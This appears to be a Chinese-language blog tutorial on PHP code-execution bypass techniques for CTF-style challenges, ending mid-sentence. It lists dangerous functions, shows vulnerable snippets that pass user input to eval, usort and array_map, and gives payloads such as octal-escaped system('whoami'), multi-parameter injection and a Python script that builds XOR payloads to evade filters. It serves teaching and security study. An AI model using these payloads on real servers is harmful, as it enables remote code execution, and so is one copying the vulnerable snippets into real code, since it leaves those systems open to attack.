    <content type="html"><![CDATA[<h1 id="php的各种绕过姿势"><a href="#php的各种绕过姿势" class="headerlink" title="php的各种绕过姿势"></a>php的各种绕过姿势</h1><h1 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h1><p>首先来看看在<code>PHP</code>中有哪些函数有代码执行的功能</p><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>最常见的代码执行函数，把<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a> code 作为PHP代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span> ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20230307190834341.png" alt="image-20230307190834341"> </p><h2 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h2><p>检查一个断言是否为<code>false</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP <span class="hljs-number">5</span><br><span class="hljs-title function_ invoke__">assert</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span> [, <span class="hljs-keyword">string</span> <span class="hljs-variable">$description</span> ] ) : <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP <span class="hljs-number">7</span><br><span class="hljs-title function_ invoke__">assert</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span> [, <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$exception</span> ] ) : <span class="hljs-keyword">bool</span><br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p><code>assert()</code>会检查指定的<code>assertion</code>并在结果为<code>false</code>时采取适当的行动。在<code>PHP5</code>或<code>PHP7</code>中，如果<code>assertion</code>是字符串，它将会被<code>assert()</code>当做<code>PHP</code>代码来执行。</p><p><img src="D:/mdimage/image-20230307191009863.png" alt="image-20230307191009863"> 注意版本问题</p><h2 id="preg-replace-x2F-e"><a href="#preg-replace-x2F-e" class="headerlink" title="preg_replace()+&#x2F;e"></a>preg_replace()+&#x2F;e</h2><p>执行一个正则表达式的搜索和替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p>搜索<code>subject</code>中匹配<code>pattern</code>的部分，以<code>replacement</code>进行替换。如果<code>pattern</code>的模式修饰符使用<code>/e</code>，那么当<code>subject</code>被匹配成功时，<code>replacement</code>会被当做PHP代码执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS： preg_replace()+函数的/e修饰符在PHP7中被移除<br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\image-20220927205346256.png" alt="image-20220927205346256"> </p><p><img src="D:/mdimage/image-20230307191803389.png" alt="image-20230307191803389">&#x2F;e 它表示将模式字符串解释为 PHP 代码并执行它，然后将执行结果作为替换字符串</p><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h2><p>创建一个匿名（lambda样式）函数</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">create_function ( <span class="hljs-built_in">string</span> $args , <span class="hljs-built_in">string</span> $code ) : <span class="hljs-built_in">string</span><br></code></pre></td></tr></table></figure><p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。如果没有严格对参数传递进行过滤，攻击者可以构造payload传递给create_function()对参数或函数体闭合注入恶意代码导致代码执行</p><p><img src="D:/mdimage/image-20220928183339905.png" alt="image-20220928183339905"> </p><p><img src="D:/mdimage/image-20220928183345893.png" alt="image-20220928183345893"> </p><h1 id="可回调函数"><a href="#可回调函数" class="headerlink" title="可回调函数"></a>可回调函数</h1><p>从前有座山。。。</p><p>在这里</p><h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h2><p>为数组的每个元素应用回调函数</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">array_map ( callable $callback ,<span class="hljs-built_in"> array </span>$array ,<span class="hljs-built_in"> array </span>...$arrays )<span class="hljs-keyword"> :</span> array<br></code></pre></td></tr></table></figure><p>返回数组，是为<code>array</code>每个元素应用<code>callback</code>函数之后的数组。 <code>array_map()</code>返回一个<code>array</code>，数组内容为<code>array1</code>的元素按索引顺序为参数调用<code>callback</code>后的结果（有更多数组时，还会传入<code>arrays</code>的元素）。 <code>callback</code>函数形参的数量必须匹配<code>array_map()</code>实参中数组的数量。</p><p>下面是一个实例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><span class="hljs-variable">$squares</span> = <span class="hljs-title function_ invoke__">array_map</span>(function(<span class="hljs-variable">$x</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable">$x</span> * <span class="hljs-variable">$x</span>; &#125;, <span class="hljs-variable">$array</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$squares</span>);<br></code></pre></td></tr></table></figure><p>利用代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$array</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;arg&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$array</span>);<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928184209095.png" alt="image-20220928184209095"> </p><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>把第一个参数作为回调函数调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span> ( <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span> [, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$parameter</span> [, <span class="hljs-keyword">mixed</span> $... ]] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p>第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。</p><p><img src="D:/mdimage/image-20220928184819744.png" alt="image-20220928184819744"> </p><h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h2><p>调用回调函数，并把一个数组参数作为回调函数的参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">call_user_func_array ( callable <span class="hljs-variable">$callback</span> , array <span class="hljs-variable">$param_arr</span> ) : mixed<br></code></pre></td></tr></table></figure><p>把第一个参数作为回调函数<code>callback</code>调用，把参数数组作<code>param_arr</code>为回调函数的的参数传入。跟<code>array_map()</code>相似</p><p><img src="D:/mdimage/image-20220928184904851.png" alt="image-20220928184904851"> </p><h2 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h2><p>用回调函数过滤数组中的单元</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">array_filter ( array <span class="hljs-variable">$array</span> [, callable <span class="hljs-variable">$callback</span> [, int <span class="hljs-variable">$flag</span> = 0 ]] ) : array<br></code></pre></td></tr></table></figure><p>依次将<code>array</code>数组中的每个值传递到<code>callback</code>函数。如果<code>callback</code>函数返回<code>true</code>，则<code>array</code>数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><p><img src="D:/mdimage/image-20220928185052033.png" alt="image-20220928185052033"> </p><h2 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h2><p>使用用户自定义的比较函数对数组中的值进行排序</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">usort (<span class="hljs-built_in"> array </span>&amp;$array , callable $value_compare_func )<span class="hljs-keyword"> :</span> bool<br></code></pre></td></tr></table></figure><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p><p>漏洞如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$array</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array&#x27;</span>];<br><span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$array</span>,<span class="hljs-variable">$func</span>);<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20230307194241008.png" alt="image-20230307194241008">  </p><h2 id="php可变长参数"><a href="#php可变长参数" class="headerlink" title="php可变长参数"></a>php可变长参数</h2><p>当<code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>时，php有一个<code>参数变长</code>特性</p><p>PHP支持可变长参数函数。这让我们可以在函数中传递<code>0</code>，<code>1</code>,<code>...</code>或<code>n</code>个参数。 为此，您需要在参数名称前使用<code>3</code>个省略号(点)。</p><p><code>3</code>点(<code>...</code>)概念是从<strong>PHP 5.6</strong>开始实现的可变长参数。下面来看看一个简单的例子PHP变长参数函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params">...<span class="hljs-variable">$numbers</span></span>) </span>&#123;  <br>    <span class="hljs-variable">$sum</span> = <span class="hljs-number">0</span>;  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$numbers</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$n</span>) &#123;  <br>        <span class="hljs-variable">$sum</span> += <span class="hljs-variable">$n</span>;  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$sum</span>;  <br>&#125;  <br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">10<br></code></pre></td></tr></table></figure><p>然后我们就可以就和上面的usort语句进行应用啦</p><p><img src="D:/mdimage/image-20220928190332226.png" alt="image-20220928190332226"> </p><h1 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h1><blockquote><p>字符串拼接绕过适用于绕过过滤具体关键字的限制</p><p>使用版本：PHP&gt;7</p></blockquote><p><img src="D:/mdimage/image-20220928190439600.png" alt="image-20220928190439600"> &#x2F;i是大小写绕过</p><p>可以按照下面这个方法进行构造</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(p.h.p.i.n.f.o)</span><span class="hljs-comment">()</span>;<br><span class="hljs-comment">(sy.(st)</span>.em)<span class="hljs-comment">(whoami)</span>;<br><span class="hljs-comment">(sy.(st)</span>.em)<span class="hljs-comment">(who.ami)</span>;<br><span class="hljs-comment">(s.y.s.t.e.m)</span><span class="hljs-comment">(&quot;whoami&quot;)</span>;<br>.......<br></code></pre></td></tr></table></figure><p>可以注意到上面括号中并没有使用单双引号来表示字符串，这是因为</p><blockquote><p>在PHP中不一定需要<code>引号(单引号/双引号)</code>来表示字符串。PHP支持我们声明元素的类型，比如<code>$name = (string)Decemberus;</code>，在这种情况下，<code>$name</code>就包含字符串<code>&quot;Decemberus&quot;</code>，此外，如果不显示声明类型，那么PHP会将<code>圆括号内的数据当成字符串</code>来处理</p></blockquote><p>挖坑：这一块我一脸懵逼，查了好多资料做了很多实验也没有办法说明这种做法是正确的，要么error要么warning，怪了</p><h1 id="字符串转义绕过"><a href="#字符串转义绕过" class="headerlink" title="字符串转义绕过"></a>字符串转义绕过</h1><blockquote><p>适用PHP版本：<code>PHP&gt;=7</code></p></blockquote><p><strong>注意，注意这里转义后的字符必须双引号包裹传参</strong></p><p>以八进制表示的<code>\[0–7]&#123;1,3&#125;</code>转义字符会自动适配byte（如<code>&quot;\400&quot; == “\000”</code>）<br>以十六进制的<code>\x[0–9A-Fa-f]&#123;1,2&#125;</code>转义字符表示法（如<code>“\x41&quot;</code>）<br>以Unicode表示的<code>\u&#123;[0–9A-Fa-f]+&#125;</code>字符，会输出为UTF-8字符串</p><p><img src="D:/mdimage/image-20220928191353537.png" alt="image-20220928191353537"> </p><p>另外，八进制的方法可以绕过<code>无字母传参</code>进行代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="hljs-string">&quot;\167\150\157\141\155\151&quot;</span>);<span class="hljs-comment">#system(&#x27;whoami&#x27;);</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928191455864.png" alt="image-20220928191455864"> </p><h1 id="多次传参绕过"><a href="#多次传参绕过" class="headerlink" title="多次传参绕过"></a>多次传参绕过</h1><blockquote><p>适用PHP版本：<code>无限制</code></p></blockquote><p>如果过滤了<code>引号(单引号/双引号)</code>，可以通过以下方法绕过</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p><img src="D:/mdimage/image-20220928191712923.png" alt="image-20220928191712923"> </p><p>先post参数</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-number">2</span>])<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>构造了这个以后可以通过get方法传入以下参数</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span><br>?<span class="hljs-number">1</span>=system<span class="hljs-variable">&amp;2</span>=whoami<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928192306238.png" alt="image-20220928192306238"> </p><p>这里需要注意，用get传参数的时候千万别用hackerbar，否则会对url编两次码</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>也可以传入POST参数一步到位</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-number">2</span>])<span class="hljs-comment">;&amp;1=system&amp;2=whoami</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928194334185.png" alt="image-20220928194334185"> </p><h2 id="绕过过滤引号"><a href="#绕过过滤引号" class="headerlink" title="绕过过滤引号"></a>绕过过滤引号</h2><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">(<span class="hljs-name">sy.st.em</span>)(<span class="hljs-name">whoami</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="绕过参数长度限制"><a href="#绕过参数长度限制" class="headerlink" title="绕过参数长度限制"></a>绕过参数长度限制</h2><p>另外如果碰到参数长度受限制，也可以通过多次传参的方法绕过参数长度限制或者回调函数</p><h3 id="多次传参"><a href="#多次传参" class="headerlink" title="多次传参"></a>多次传参</h3><p><img src="D:/mdimage/image-20220928194625171.png" alt="image-20220928194625171"> </p><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p><img src="D:/mdimage/image-20220928194645157.png" alt="image-20220928194645157"> </p><p>再次重复一下之前的可变参数操作是要求php版本&gt;5.6且&lt;7</p><h1 id="内置函数访问绕过"><a href="#内置函数访问绕过" class="headerlink" title="内置函数访问绕过"></a>内置函数访问绕过</h1><p>适用于PHP版本：Windows本地测试的是<code>PHP&gt;=7</code>可以成功，<code>PHP5</code>测试虽然报错但是并不肯定不能使用</p><p>这个可以对比ssti学习</p><p>利用这种方法首先还需要知道PHP的具体版本，因为每个版本的<code>get_defined_functions()</code>返回的值都是不一样的，这里以<code>php7.4.3</code>为准</p><p><img src="D:/mdimage/image-20220928201350557.png" alt="image-20220928201350557"> </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">php -r <span class="hljs-string">&quot;print_r(get_defined_functions());&quot;</span> <span class="hljs-string">|findstr /S &quot;</span>phpinfo<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928200928521.png" alt="image-20220928200928521"> </p><p>上面图里的266其实就是我主机上面的600，也就是phpinfo</p><p><img src="D:/mdimage/image-20220928201540021.png" alt="image-20220928201540021"> </p><p>358就是system</p><h1 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h1><p>适用PHP版本：<code>无限制</code></p><p>这一点和sql注入里面的异或注入并非一个意思</p><p>在sql注入里的异或注入中</p><p>具体规则为：</p><blockquote><p>两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），null与任何条件做异或运算都为null</p></blockquote><p>而在这里事情就变得不同了</p><h2 id="当过滤字符较多时（无参数RCE）"><a href="#当过滤字符较多时（无参数RCE）" class="headerlink" title="当过滤字符较多时（无参数RCE）"></a>当过滤字符较多时（无参数RCE）</h2><h3 id="方法一（利用位运算符）"><a href="#方法一（利用位运算符）" class="headerlink" title="方法一（利用位运算符）"></a>方法一（利用位运算符）</h3><p>在PHP中两个字符串异或之后，得到的还是一个字符串。<br>例如：我们异或 <code>?</code> 和 <code>~</code> 之后得到的是 <code>A</code></p><p><img src="D:/mdimage/20200304105440370.png" alt="图一"> </p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">字符：?         ASCII码：63           二进制：  00‭11 1111‬<br>字符：~         ASCII码：126          二进制： <span class="hljs-number"> 0111 </span>1110‬<br>异或规则：<br>1   XOR  <span class="hljs-number"> 0 </span>  =   1<br>0   XOR  <span class="hljs-number"> 1 </span>  =   1<br>0   XOR  <span class="hljs-number"> 0 </span>  =   0<br>1   XOR  <span class="hljs-number"> 1 </span>  =   0<br>上述两个字符异或得到 二进制： <span class="hljs-number"> 0100 </span>0001<br>该二进制的十进制也就是：65<br>对应的ASCII码是：A<br></code></pre></td></tr></table></figure><p>接下来看一道例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了<code>所有英文字母和数字</code>，但是我们知道ASCII码中还有很多<code>字母数字之外的字符</code>，利用这些字符进行异或可以得到我们想要的字符</p><p>PS：取ASCII表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br>payload = <span class="hljs-string">&quot;assert&quot;</span><br>strlist = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span>, <span class="hljs-number">37</span>, <span class="hljs-number">38</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">42</span>, <span class="hljs-number">43</span>, <span class="hljs-number">44</span>, <span class="hljs-number">45</span>, <span class="hljs-number">46</span>, <span class="hljs-number">47</span>, <span class="hljs-number">58</span>, <span class="hljs-number">59</span>, <span class="hljs-number">60</span>, <span class="hljs-number">61</span>, <span class="hljs-number">62</span>, <span class="hljs-number">63</span>, <span class="hljs-number">64</span>, <span class="hljs-number">91</span>, <span class="hljs-number">93</span>, <span class="hljs-number">94</span>, <span class="hljs-number">95</span>, <span class="hljs-number">96</span>, <span class="hljs-number">123</span>, <span class="hljs-number">124</span>, <span class="hljs-number">125</span>, <span class="hljs-number">126</span>, <span class="hljs-number">127</span>]<br><span class="hljs-comment">#strlist是ascii表中所有非字母数字的字符十进制</span><br>str1,str2 = <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> payload:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strlist:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strlist:<br>            <span class="hljs-keyword">if</span>(i ^ j == <span class="hljs-built_in">ord</span>(char)):<br>                i = <span class="hljs-string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])<span class="hljs-comment">#百分号代表url编码</span><br>                j = <span class="hljs-string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:])<span class="hljs-comment">#2：表示切片操作</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;(&#x27;&#123;0&#125;&#x27;^&#x27;&#123;1&#125;&#x27;)&quot;</span>.<span class="hljs-built_in">format</span>(i,j),end=<span class="hljs-string">&quot;.&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>一次代码执行只能得到我们想要执行语句的字符串，并不能执行语句，所以需要执行两次代码执行，构造</p><blockquote><p>当使用格式化字符串时，<code>&#123;:0&gt;2&#125;</code> 表示将要插入的值按照指定格式进行输出。具体地说，这个格式化字符串的含义是：</p><ul><li><code>:</code> 表示格式说明符的开始。</li><li><code>0</code> 表示使用数字 0 作为填充字符。</li><li><code>&gt;</code> 表示将值右对齐。</li><li><code>2</code> 表示总长度为 2。</li></ul><p>例如，如果要将整数 1 格式化为 2 位的字符串，可以使用以下代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pythonCopy</span> codes = &#x27;&#123;:<span class="hljs-number">0</span>&gt;<span class="hljs-number">2</span>&#125;&#x27;.format(<span class="hljs-number">1</span>)<br><span class="hljs-attribute">print</span>(s)  # 输出：<span class="hljs-number">01</span><br></code></pre></td></tr></table></figure><p>这里，<code>1</code> 被转换为字符串 <code>&#39;1&#39;</code>，然后使用 <code>&#39;0&#39;</code> 字符作为填充字符，在字符串的左侧填充，使得字符串的总长度为 2。</p><p>类似地，如果要将整数 10 格式化为 2 位的字符串，可以使用以下代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pythonCopy</span> codes = &#x27;&#123;:<span class="hljs-number">0</span>&gt;<span class="hljs-number">2</span>&#125;&#x27;.format(<span class="hljs-number">10</span>)<br><span class="hljs-attribute">print</span>(s)  # 输出：<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>在这个例子中，整数 <code>10</code> 被转换为字符串 <code>&#39;10&#39;</code>，因为它的长度已经是 2，所以不需要填充任何字符。</p><p>在上面的代码中，<code>&#123;:0&gt;2&#125;</code> 用于将整数转换为 2 位的十六进制字符串，并在前面添加 <code>%</code> 符号。例如，如果整数是 10，则转换后的字符串为 <code>%0a</code>。由于要保证字符串的总长度为 2，因此使用了 <code>&#123;:0&gt;2&#125;</code> 格式化字符串来进行格式化。</p></blockquote><blockquote><p>在这个代码中，<code>2:</code> 是一个切片操作，用于获取从 <code>hex(i)</code> 返回的字符串中第 2 个字符开始的子字符串。</p><p>具体来说，<code>hex(i)</code> 将整数 <code>i</code> 转换为十六进制字符串，例如，<code>hex(10)</code> 返回字符串 <code>&#39;0xa&#39;</code>。然后，<code>[2:]</code> 将从字符串的第 2 个字符开始的子字符串提取出来，例如，<code>&#39;a&#39;</code>。最后，使用 <code>&#39;&#123;:0&gt;2&#125;&#39;</code> 格式化字符串将字符 <code>&#39;a&#39;</code> 转换为一个 2 位的十六进制字符串，例如，<code>&#39;%0a&#39;</code>。</p><p>因此，<code>i = &#39;%&#123;:0&gt;2&#125;&#39;.format(hex(i)[2:])</code> 的作用是将整数 <code>i</code> 转换为 URL 编码的字符串。该字符串的格式为 <code>%</code> 后跟两个十六进制数字，并使用前导零进行填充。例如，如果整数 <code>i</code> 的值为 10，则上述代码将将 <code>i</code> 转换为字符串 <code>%0a</code>。这个字符串可以用于构造 HTTP 请求的 URL 